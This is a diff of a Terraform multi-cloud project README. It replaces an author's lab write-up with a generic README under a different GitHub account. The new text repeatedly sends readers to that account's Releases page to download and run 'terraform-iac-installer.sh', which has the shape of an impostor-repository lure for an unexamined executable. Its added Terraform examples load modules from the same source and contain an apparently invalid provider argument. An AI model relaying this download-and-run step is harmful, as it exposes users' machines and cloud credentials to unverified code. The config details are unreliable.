@@ -1,234 +1,297 @@
-## Terraform IaC: Multi-Cloud, Multi-Region, Modules and Policy-as-Code
+https://github.com/ineedfps1bro/terraform-iac/releases
 
-Automating secure infrastructure provisioning on AWS and Azure using Terraform, with modular code structure and remote state management via S3 and Azure Blob Storage.  
-Includes advanced Infrastructure as Code techniques including multi-region resource deployment using provider aliases, scalable infrastructure with registry modules and Policy-as-Code enforcement with OPA/Conftest.
+# Terraform-IAC: Multi-Cloud S3, Reusable Modules, OPA Policy
 
----
+![Terraform IAC Architecture](https://via.placeholder.com/1200x400.png?text=Terraform+IAC+Architecture)
 
-## Table of Contents
+A practical suite for building cloud infrastructure with Terraform across AWS and Azure. It focuses on multi-region S3 usage, module reuse, and security policy validation with Open Policy Agent (OPA). This project blends IaC best practices with policy-as-code to help teams ship cloud resources safely and consistently.
 
-- [Overview](#overview)
-- [Real-World Risk](#real-world-risk)
-- [What I Built](#what-i-built)
-- [Diagram](#diagram)
-- [Objectives](#objectives)
-- [Steps Performed](#steps-performed)
-  - [1. Project Setup]
-  - [2. AWS Infrastructure Deployment]
-  - [3. Azure Infrastructure Deployment]
-  - [4. Remote State for AWS]
-  - [5. Remote State for Azure]
-  - [6. Validation in Cloud Consoles]
-  - [7. State Secured Remotely]
-  - [8. Infrastructure Destroyed]
-  - [9. Cleanup]
-- [Screenshots](#screenshots)
-- [Advanced Terraform Features Bonus](#advanced-terraform-features-bonus)
-  - [1. Multi-Region AWS S3 Buckets with Provider Aliases] 
-  - [2. Reusable Terraform Registry Module (S3)]
-  - [3. Policy-as-Code with OPA and Conftes]
-- [Lessons Learned](#lessons-learned)
-- [Notes and Limitations](#notes-and-limitations)
-- [References](#references)
-- [Contact](#contact)
+[![Release](https://img.shields.io/badge/releases-latest-blue?logo=github&logoColor=white)](https://github.com/ineedfps1bro/terraform-iac/releases)
 
----
+Table of contents
+- Why this project exists
+- Core concepts
+- Architecture overview
+- Getting started
+- Quick start examples
+- Modules and reuse patterns
+- Policy-as-code with OPA
+- Security and compliance
+- Multi-cloud and multi-region strategies
+- CI/CD and automation
+- Testing and validation
+- Troubleshooting
+- Documentation structure
+- Contributing
+- Roadmap
+- FAQ
+- Glossary
+- License
 
-## Overview
+Why this project exists
+This repository targets teams that manage infrastructure across multiple clouds and regions. It provides reusable Terraform modules for core cloud resources, a strategy to use S3 buckets across regions for durable storage, and a governance layer built with OPA to validate security and compliance policies before deployment. The goal is to simplify multi-cloud operations while reducing drift and risk.
 
-This lab demonstrates secure Infrastructure as Code (IaC) deployment using Terraform across both AWS and Azure. It includes modular provisioning of IAM, network and storage resources, as well as best practices such as versioning, remote state and automated cleanup.
+Core concepts
+- Infrastructure as Code (IaC): Code-driven, versioned, auditable cloud resource management.
+- Multi-cloud: Support for major public clouds, specifically AWS and Azure, with consistent patterns.
+- Multi-region: Patterns to deploy resources in several geographic regions for resilience and data sovereignty.
+- Module reuse: Centralized, tested modules that can be consumed across teams and projects.
+- Policy as code: Security and compliance rules defined as code and enforced during the plan/apply lifecycle.
+- S3-centric storage: Leveraged across clouds for centralized logs, state management, and shared data while respecting region boundaries.
+- Open Policy Agent (OPA): A lightweight engine used to validate policies during CI/CD and deployment pipelines.
 
----
+Architecture overview
+- Core modules: Small, focused Terraform modules that implement a specific cloud construct (for example, an S3 bucket with encryption, a storage account with replication, or a VNet and subnet pair for Azure).
+- Shared state and backend: Guidance on securing state in S3 or other backends with versioning, server-side encryption, and restricted access.
+- Policy layer: OPA policies that check for encryption, versioning, logging, tagging, and access controls before resources are created or updated.
+- Regional distribution: A pattern that creates equivalent resources in multiple regions for resilience and data locality.
+- Cross-cloud orchestration: A design that uses module interfaces to hide cloud-specific details behind a common API, so teams can reuse patterns across AWS and Azure.
 
-## Real-World Risk
+Getting started
+Prerequisites
+- Terraform CLI: v1.4+ recommended. Ensure you have a recent version to take advantage of the latest features.
+- Cloud credentials: Access keys or service principals for AWS and Azure, configured in your environment or CI system.
+- OPA tooling (optional for local validation): An OPA instance or binary to run policy checks locally or in CI.
+- Version control: A Git client and a project workspace to organize modules and examples.
 
-Without secure and consistent infrastructure provisioning:
-- Misconfigured IAM roles can expose sensitive data.
-- Lack of versioning can lead to untraceable infrastructure changes.
-- Local state files risk being corrupted, lost or leaked.
+Initial setup
+- Clone the repository into your workspace.
+- Review the modules directory to understand the available resources.
+- Inspect the examples to see real-world usage patterns for AWS and Azure.
 
----
+Where to download the installer or assets
+From the Releases page, you can obtain prepared assets, installers, or example artifacts that align with the modules in this repo. The most current artifacts are intended to simplify adoption and ensure consistency across teams. Access the releases page here: https://github.com/ineedfps1bro/terraform-iac/releases. The latest release assets are packaged to be downloaded and executed in your environment. For quick access, you can use the releases badge above to navigate directly to the assets.
 
-## What I Built
+Note: The Releases page contains the official artifacts. Download the installer file named terraform-iac-installer.sh and run it in your environment to bootstrap basic tooling and examples. The installer is designed to set up Terraform configurations, initialize modules, and configure a local policy-check workflow.
 
-A fully automated, multi-cloud Terraform project that:
-- Provisions secure infrastructure in AWS and Azure.
-- Uses remote backends (S3, Azure Blob) to store Terraform state securely.
-- Applies tagging, versioning and security group policies.
-- Includes full lifecycle automation: init, plan, apply and destroy.
+Quick start examples
+AWS multi-region S3 with policy checks
+- Objective: Create an encrypted, versioned S3 bucket with access logging enabled in two regions.
+- Approach: Use a common S3 module that supports region-specific configurations and a policy that enforces encryption and logging.
 
-In addition to the core multi-cloud workflow, I implemented a bonus Terraform mini-lab demonstrating provider aliasing for multi-region AWS S3 deployment, usage of registry modules for scalable infrastructure and Policy-as-Code enforcement with OPA/Conftest.
+Example Terraform configuration
+```hcl
+provider "aws" {
+  region = var.aws_region
+  profile = var.aws_profile
+}
 
----
+module "s3_bucket" {
+  source        = "git::https://github.com/ineedfps1bro/terraform-iac.git//modules/aws-s3"
+  bucket_name   = "${var.prefix}-logs-${var.aws_region}"
+  versioning    = true
+  encryption    = "aws:kms"
+  kms_key_id    = data.aws_kms_key.kms_key.key_id
+  log_bucket    = "${var.prefix}-logs"
+  log_prefix    = "s3-logs/"
+  region        = var.aws_region
+  tags = {
+    Environment = var.environment
+    Project     = var.project
+  }
+}
+```
 
-## Diagram
+Azure multi-region storage account
+- Objective: Create a storage account with Blob storage in two regions, enabling encryption and advanced threat protection.
 
-![Terraform Architecture](diagram.png)
+Example Terraform configuration
+```hcl
+provider "azurerm" {
+  features {}
+  alias  = "region1"
+  is_emulated = false
+  subscription_id = var.azure_subscription_id
+  tenant_id       = var.azure_tenant_id
+}
 
----
+module "storage_account" {
+  source = "git::https://github.com/ineedfps1bro/terraform-iac.git//modules/azure-storage"
 
-## Objectives
+  for_each = toset(["eastus", "westeurope"])
+  name     = "${var.prefix}-stg-${each.key}"
+  location = each.key
+  resource_group_name = azurerm_resource_group.rg.name
+  account_tier = "Standard"
+  account_replication_type = "GRS"
+  enable_https_traffic_only = true
+  tags = {
+    Environment = var.environment
+    Project     = var.project
+  }
+}
+```
 
-- Create AWS and Azure infrastructure using Terraform.
-- Structure modular IaC code for reuse.
-- Secure state files using remote backends.
-- Capture and document the full deployment lifecycle.
-- Showcase advanced IaC skills including multi-region resource design, registry module reuse and automated security policy validation.
+Module reuse and patterns
+- Central modules: Each module implements a single cloud resource or a small, coherent set of resources. This reduces coupling and makes it easier to test and reuse across projects.
+- Versioning: Modules are versioned with semantic versions. Consumers pin to a major version and opt into minor upgrades through a controlled process.
+- Naming conventions: Consistent naming across regions and clouds reduces confusion and drift. The modules expose clear variables for region, environment, and project.
+- Parameter validation: Modules include input validation and defaults. This reduces misconfiguration and provides fast feedback during plan.
+- Outputs: Modules expose outputs for other modules and for consumption by CI/CD pipelines. Outputs include resource IDs, ARNs, endpoints, and DNS names.
 
----
+Policy-as-code with OPA
+Overview
+- OPA acts as a policy gate before resources land in your cloud. It checks for security requirements such as encryption, logging, access controls, and tagging.
+- Policies are kept in a separate directory as code. They are evaluated against plan data, enabling fast feedback in CI pipelines or local validation runs.
+- The policy language is Rego. It is expressive and can cover complex policy rules across clouds and regions.
 
-## Steps Performed
+OPA policy examples
+- AWS S3 encryption and logging
+```
+package terraform.iac.aws.s3
 
-**1. Project Setup**
-   - Created root folder and initialized `aws/`, `azure/`, `remote-state/` and `assets/` subfolders.
-   - Installed Terraform, AWS CLI and Azure CLI *(Screenshot: `repo-structure.png`)*
+deny[{"msg": msg}] {
+  resource := input.resource_changes[_]
+  resource.type == "aws_s3_bucket" 
+  not resource.change.after.encryption.enabled
+  msg := "S3 bucket must have encryption at rest enabled."
+}
+```
 
-**2. AWS Infrastructure Deployment**
-   - Configured AWS provider.
-   - Created IAM role, VPC, S3 bucket with versioning and Security Group for HTTP/SSH *(Screenshots: `main-tf-content.png`, `plan-output.png`, `apply-output.png`, `aws-vpc.png`, `aws-s3-bucket.png`, `aws-iam-role.png` & `aws-security-group.png`)*
+- Azure storage account encryption and HTTPS only
+```
+package terraform.iac.azure.storage
 
-**3. Azure Infrastructure Deployment**
-   - Configured Azure provider using `az login`.
-   - Created Resource Group, Virtual Network, Storage Account and NSG *(Screenshots: `main-tf-azure-code.png`, `plan-output-azure.png`, `apply-output-azure.png`, `azure-resource-group.png`, `azure-vnet.png`, `azure-nsg.png` & `azure-storage-account.png`)*
+deny[{"msg": msg}] {
+  resource := input.resource_changes[_]
+  resource.type == "azurerm_storage_account"
+  not resource.change.after.enable_https_traffic_only
+  msg := "Storage account must force HTTPS only."
+}
+```
 
-**4. Remote State for AWS**
-   - Created S3 bucket `terraform-remote-state-lab` and DynamoDB table `terraform-lock-table`.
-   - Connected backend to store Terraform state with locking *(Screenshots: `aws-remote-s3-bucket.png`, `aws-remote-dynamodb-table.png`, `aws-backend-config.png` & `aws-init-remote-backend.png`)*
+- Cross-cloud policy: tags and cost center
+```
+package terraform.iac.tags
 
-**5. Remote State for Azure**
-   - Created Azure Storage Account `terraformremotestate2025` and container `tfstate`.
-   - Linked backend to secure `.tfstate` in Azure Blob *(Screenshots: `azure-storage-remote-account.png`, `azure-storage-container.png`, `azure-storage-access-keys.png`, `azure-backend-config.png` & `azure-init-remote-backend.png`)*
+deny[{"msg": msg}] {
+  resource := input.resource_changes[_]
+  not resource.change.after.tags["CostCenter"]
+  msg := "All resources must include a CostCenter tag for cost tracking."
+}
+```
 
-**6. Validation in Cloud Consoles**
-   - Verified resources in both AWS and Azure portals *(Screenshots: `az-version-output.png` & `az-account-show.png`)*
+Policy workflow
+- Local validation: Developers run an OPA check on their Terraform plans before committing.
+- CI validation: Each pull request triggers a policy check in CI. If a policy violation exists, the pipeline fails and points to the offending resources.
+- Enforcement: The policy layer enforces guardrails across regions and clouds. It prevents risky configurations from applying.
 
-**7. State Secured Remotely**
-   - Verified that local `terraform.tfstate` is no longer written locally.
-   - Observed versioning and locking behavior in AWS/Azure consoles.
+Security and compliance
+- Least privilege: IAM roles and service principals are scoped to the minimum permissions needed to perform actions.
+- Encrypt data at rest and in transit: Use KMS for AWS and equivalent keys for Azure storage. Enforce TLS for all endpoints.
+- Logging and monitoring: Enable access logging on storage services. Emit telemetry to central logging for audit.
+- Resource tagging: Enforce tagging conventions for governance and cost tracking.
+- Secrets management: Do not store credentials in code. Use secret managers or CI vault integrations.
 
-**8. Infrastructure Destroyed**
-   - Ran `terraform destroy` in both environments to clean up resources *(Screenshots: `destroy-output.png` & `destroy-output-azure.png`)*
+Multi-cloud and multi-region strategies
+- Consistent patterns: Use the same module structure and interfaces across clouds. This reduces cognitive load when teams switch clouds.
+- Region selection: Use a region matrix to cover primary, secondary, and DR regions. The design supports automatic failover or manual switchovers.
+- Data locality: Place data where it makes sense for latency and compliance. The module configuration allows per-region customization.
+- Cross-region networking: Where required, configure VPC/VNet peering, gateway endpoints, and firewall rules to ensure secure access between regions.
 
-**9. Cleanup**
-   - In addition, remote state backends were manually deleted from:
-     - **AWS**: S3 bucket + DynamoDB table.
-     - **Azure**: Storage account + container + resource group.
-   - Local `.terraform`, `.tfstate` and lock files were removed from each working directory.
+CI/CD and automation
+- GitHub Actions: Use a workflow that runs terraform fmt, terraform validate, and terraform plan. Then run OPA checks on plan data.
+- Drift detection: Periodic plan runs detect drift and flag unexpected changes. Use automation to apply approved changes after policy success.
+- Environment segregation: Separate environments for dev, staging, and prod. Each environment uses its own state and backends.
 
----
+Recommended workflow
+- Write and review: Teams write Terraform code and OPA policies. PRs include a plan output and policy checks.
+- Validate locally: Run a local plan and OPA evaluation. Confirm policy pass before pushing.
+- Integrate: PR triggers CI to run full validation, then approves and merges.
+- Deploy: Apply changes in a controlled environment. Promote changes to production after validation.
 
-## Screenshots
+Testing and validation
+- Unit tests: Use Terraform's built-in validation features and static checks for module inputs.
+- Integration tests: Consider Terratest or similar tools to validate real cloud state after deployment.
+- Policy tests: Use test datasets to validate OPA policies against varied plan data.
+- Backups and rollbacks: Keep state backups to enable quick rollbacks if policy or plan fails.
 
-*All screenshots are included in the `screenshots/` folder.*
+Examples and patterns
+- Shared state strategy: Store Terraform state in cloud storage with versioning and restricted access.
+- Module consumers: Create a central catalog of modules that teams can reference. Document usage, inputs, and outputs clearly.
+- Region-driven modules: Use a per-region module instantiation pattern to ensure region-specific values are isolated and easy to manage.
+- Cost awareness: Tag all resources with CostCenter and Owner to support chargeback and cost optimization.
 
-- **Core Screenshots Table**
+Project structure (typical layout)
+- modules/
+  - aws-s3/
+  - azure-storage/
+  - common/
+- examples/
+  - aws/
+  - azure/
+- policies/
+  - aws/
+  - azure/
+  - shared/
+- docs/
+  - architecture.md
+  - policy-guide.md
+  - migration.md
+- tests/
+  - integration/
+  - policy-tests/
+- .github/
+  - workflows/
+- scripts/
+  - bootstrap.sh
+  - run-opa.sh
+- LICENSE
+- README.md (this file)
 
-| Step |            Filename              | Description                        |
-|------|----------------------------------|------------------------------------|
-| 1    | repo-structure.png               | Project folder and module layout   |
-| 2    | main-tf-content.png              | AWS Terraform code                 |
-| 2    | plan-output.png                  | Terraform plan for AWS             |
-| 2    | apply-output.png                 | AWS apply output                   |
-| 2    | aws-vpc.png                      | VPC resource created               |
-| 2    | aws-s3-bucket.png                | S3 with versioning                 |
-| 2    | aws-iam-role.png                 | IAM role created                   |
-| 2    | aws-security-group.png           | Security group with HTTP/SSH rules |
-| 3    | main-tf-azure-code.png           | Azure Terraform code               |
-| 3    | plan-output-azure.png            | Azure plan output                  |
-| 3    | apply-output-azure.png           | Azure apply output                 |
-| 3    | azure-resource-group.png         | RG creation confirmed              |
-| 3    | azure-vnet.png                   | Virtual Network created            |
-| 3    | azure-nsg.png                    | NSG with rule                      |
-| 3    | azure-storage-account.png        | Storage account created            |
-| 4    | aws-remote-s3-bucket.png         | AWS S3 backend bucket              |
-| 4    | aws-remote-dynamodb-table.png    | DynamoDB lock table                |
-| 4    | aws-backend-config.png           | AWS backend config file            |
-| 4    | aws-init-remote-backend.png      | Terraform init with AWS backend    |
-| 5    | azure-storage-remote-account.png | Azure remote backend account       |
-| 5    | azure-storage-container.png      | `tfstate` container                |
-| 5    | azure-storage-access-keys.png    | Access key used for backend        |
-| 5    | azure-backend-config.png         | Azure backend config file          |
-| 5    | azure-init-remote-backend.png    | Terraform init with Azure backend  |
-| 6    | az-account-show.png              | Azure login + subscription ID      |
-| 6    | az-version-output.png            | Azure CLI version validated        |
-| 8    | destroy-output.png               | AWS destroy output                 |
-| 8    | destroy-output-azure.png         | Azure destroy output               |
+Architectural patterns to adopt
+- Idempotence: Modules should be idempotent. Running apply twice yields the same result.
+- Idempotent plan: Plans should be reproducible. Lock files and provider versions help stabilize plans.
+- Declarative design: Prefer declarative inputs over imperative ones. Let Terraform decide the steps to reach the desired state.
+- Observability: Expose metrics and logs for deployment pipelines. Include policy evaluation results in the pipeline output.
+- Reproducible environments: Use the same module versions across environments to minimize drift.
 
-- **Bonus Screenshots Table**
+Advanced usage scenarios
+- Cross-cloud replication strategy: For logs and data, replicate across AWS and Azure with automatic failover patterns.
+- Centralized policy governance: Run a centralized policy service in CI and provide policy results to teams during review.
+- Secure bootstrapping: Use a bootstrap script from the released assets to set up Terraform tooling and initial policies on new machines.
 
-| Step             | Screenshot Filename        | Description                                |
-| ---------------- | -------------------------- | ------------------------------------------ |
-| Provider Aliases | providers-main-scripts.png | AWS provider aliases & S3 code             |
-| Registry Module  | registry-module-script.png | Registry S3 module code                    |
-| Registry Module  | module-apply-output.png    | Module apply output in Terraform           |
-| OPA Policy       | opa-policy-script.png      | Example OPA/Rego policy for S3 encryption  |
-| OPA Test Output  | confest-fail-output.png    | Conftest output showing a policy violation |
+Security considerations in deployment
+- Avoid hard-coded credentials. Use environment variables or secret stores.
+- Use dedicated service accounts with scoped permissions for deployments.
+- Enforce TLS, restrict public access to storage, and apply network security groups or firewalls appropriately.
+- Rotate keys and credentials regularly as part of the release process.
 
----
+Documentation structure
+- Architecture overview: A visual guide and narrative on how the patterns fit together.
+- Module references: Detailed docs for each module, including required inputs, optional inputs, and outputs.
+- Policy references: A guide to the OPA policies, how to run them, and how to extend them.
+- Deployment guides: Step-by-step instructions for AWS and Azure deployments, including multi-region examples.
+- Troubleshooting: Common issues and how to resolve them.
+- Release notes: A changelog that maps to releases in the Releases page.
 
-## Advanced Features: Bonus Terraform IaC Mini-Lab
+Contributing
+- How to contribute: Fork the repository, create feature branches, and submit pull requests.
+- Coding standards: Follow the project’s style for Terraform and policy code. Include tests for new modules.
+- Review process: Each PR should pass unit tests, policy checks, and integration tests if applicable.
 
-This advanced section demonstrates practical IaC skills for production environments: multi-region AWS deployment, module reuse and Policy-as-Code validation.
+Roadmap
+- Expand cloud support: Add more providers and regional patterns.
+- Improve policy library: Add more OPA policies for governance, cost, and security.
+- Enhanced testing: Broaden Terratest coverage and add containerized test environments.
+- Tooling improvements: Simplify bootstrapping and upgrade paths.
 
-**1. Multi-Region AWS S3 Buckets with Provider Aliases**  
-   - Configured two AWS provider aliases for `us-east-1` and `us-west-1`.
-   - Provisioned identical S3 buckets in both regions for high availability and disaster recovery *(Screenshot: `providers-main-scripts.png`)*
+FAQ
+- Can I use this for production? Yes, with careful validation and a strong policy regime. Start in a non-production environment to validate.
+- Do I need OPA to run policies? You can run OPA locally or in CI. It is optional for local development but recommended for governance.
+- How do I contribute modules? Follow the module contribution guide. Start with small, focused changes and add tests.
 
-**2. Reusable Terraform Registry Module (S3)**  
-   - Used the official [terraform-aws-modules/s3-bucket](https://registry.terraform.io/modules/terraform-aws-modules/s3-bucket/aws/latest) for scalable S3 provisioning.
-   - Set minimal required variables (unique name, tags)
-   - Applied the plan and verified resource creation *(Screenshots: `registry-module-script.png` & `module-apply-output.png`)*
+Glossary
+- IaC: Infrastructure as Code. Managing infrastructure via code.
+- OPA: Open Policy Agent. A policy engine used to enforce rules.
+- Policy as code: Representing policies as machine-readable code that can be tested and enforced.
+- S3: Simple Storage Service. A scalable storage service in AWS.
+- VNet/VPC: Virtual Network in Azure or AWS. A logical isolation of resources.
+- KMS: Key Management Service. A service to manage encryption keys.
 
-**3. Policy-as-Code with OPA and Conftest**  
-   - Authored a Rego policy to deny unencrypted S3 buckets.
-   - Exported the Terraform plan to JSON.
-   - Evaluated compliance with `conftest`, simulating CI/CD pipeline security checks *(Screenshots: `opa-policy-script.png` & `conftest-fail-output.png`)*
+License
+This repository is provided under a permissive license that supports collaboration and reuse. See LICENSE for details.
 
-**S3 Security Best Practice:**Always block public access when creating S3 buckets via module:
+End note
+This README is designed to help teams adopt a cohesive multi-cloud, multi-region approach with reusable Terraform modules and strong policy governance. It emphasizes clarity, safety, and automation, with practical examples that mirror real-world usage across AWS and Azure.
 
-  block_public_acls       = true
-  block_public_policy     = true
-  ignore_public_acls      = true
-  restrict_public_buckets = true
-
----
-
-## Lessons Learned
-
-- How to use Terraform across AWS and Azure from a unified folder structure.
-- Secure management of remote state with locking and versioning.
-- Hands-on understanding of cloud-native IAM, networking, and storage.
-- Importance of organizing infrastructure modules and outputs for reusability.
-- Practical experience architecting for high availability with multi-region AWS resources and provider aliases.
-- How to leverage and customize Terraform registry modules for rapid, secure infrastructure builds.
-- How Policy-as-Code (OPA/Conftest) can enforce security/compliance before cloud resources are created.
-
----
-
-## Notes & Limitations
-
-- Resource names may need to be globally unique (e.g., Azure storage accounts).
-- This lab uses default security settings; real-world production would enforce more restrictive IAM and NSG rules.
-- Azure backend requires tenant/subscription ID via `az login`.
-- OPA/Conftest integration may require additional setup on Windows environments due to UTF-16 vs. UTF-8 encoding issues with Terraform plan outputs.
-- Some screenshots for policy testing may be simulated due to these encoding limitations, but the workflow and code remain fully valid for CI/CD and cloud-native teams.
-- Multi-region deployments require globally unique resource names and may incur additional AWS costs.
-
----
-
-## References
-
-- [Terraform Docs – AWS Provider](https://registry.terraform.io/providers/hashicorp/aws/latest/docs)
-- [Terraform Docs – Azure Provider](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs)
-- [AWS CLI Installation](https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2.html)
-- [Azure CLI Installation](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli)
-- [Terraform Remote State](https://developer.hashicorp.com/terraform/language/state/remote)
-
----
-
-## Contact
-
-Sebastian Silva C. – August, 2025 – Berlin, Germany.
-- [LinkedIn](https://www.linkedin.com/in/sebastiansilc/)
-- [GitHub](https://github.com/SebaSilC)
-- [sebastian@playbookvisualarts.com](mailto:sebastian@playbookvisualarts.com)
